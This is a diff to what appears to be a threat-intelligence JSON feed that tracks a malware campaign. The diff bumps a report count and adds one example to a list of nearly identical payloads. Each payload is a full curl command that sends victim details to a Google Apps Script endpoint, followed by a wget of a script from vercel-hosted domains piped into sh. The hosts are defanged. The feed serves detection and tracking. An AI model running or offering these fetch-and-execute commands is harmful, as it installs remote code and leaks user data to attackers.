@@ -264,10 +264,10 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 38,
-    "ReportCount": 38,
+    "DistinctPayloadCount": 39,
+    "ReportCount": 39,
     "FirstSeen": "2026-11-09T09:01:40.149000+00:00",
-    "LastSeen": "2026-11-15T09:30:34.966000+00:00",
+    "LastSeen": "2026-11-15T13:09:44.284000+00:00",
     "ReportIds": [
       "cmw9185ff2hpc0oml2t2gkjiq",
       "cmw919kau2hq20omlin08m3ae",
@@ -306,7 +306,8 @@
       "cmwhb11qu0rwv0oml97l0d5ck",
       "cmwhb3hml0rxv0omlvc1pky3i",
       "cmwhb5rpu0ryt0omlc0rks6ff",
-      "cmwhmwg110tch0omlhhoi42we"
+      "cmwhmwg110tch0omlhhoi42we",
+      "cmwhuqa3y0ubu0oml2z1942tq"
     ],
     "PayloadExamples": [
       "curl -sL -d \"id=0048088b-86c5-4092-8adf-ae27e12f8b11&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcompany-hamza-abbs[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T14%3A45%3A29.831Z&lastShellAt=2026-11-11T14%3A45%3A29.831Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
@@ -328,6 +329,7 @@
       "curl -sL -d \"id=69e0a4a8-9f08-4dce-8d93-b961c0037dfd&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fconferenciahertz[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T04%3A00%3A19.375Z&lastShellAt=2026-11-15T04%3A00%3A19.375Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=7e8fc7bb-c8b4-475a-aa0d-a0eee8b55a1a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Falloyspectrum[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-11T09%3A37%3A11.462Z&lastShellAt=2026-11-11T09%3A37%3A11.462Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=7eed998f-5d31-4117-b764-40ed848e8cf8&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]a-stergiou[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A48%3A24.713Z&lastShellAt=2026-11-15T03%3A48%3A24.713Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
+      "curl -sL -d \"id=7f21b552-6a42-42e4-8e21-66bd283b97fa&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftccgcc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T13%3A08%3A20.080Z&lastShellAt=2026-11-15T13%3A08%3A20.080Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=8217a4bd-5db0-493f-a59c-d634628d1d28&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmonadnockdevelopment[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-10T21%3A09%3A13.413Z&lastShellAt=2026-11-10T21%3A09%3A13.413Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=8483c18e-0d34-477d-a69f-39c2685acc7d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ffaizertraders[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T03%3A27%3A30.836Z&lastShellAt=2026-11-15T03%3A27%3A30.836Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=851a2189-cf51-42eb-bb25-0aca6fff4673&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdiazlawncareandmaintenance[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T08%3A59%3A37.231Z&lastShellAt=2026-11-09T08%3A59%3A37.231Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
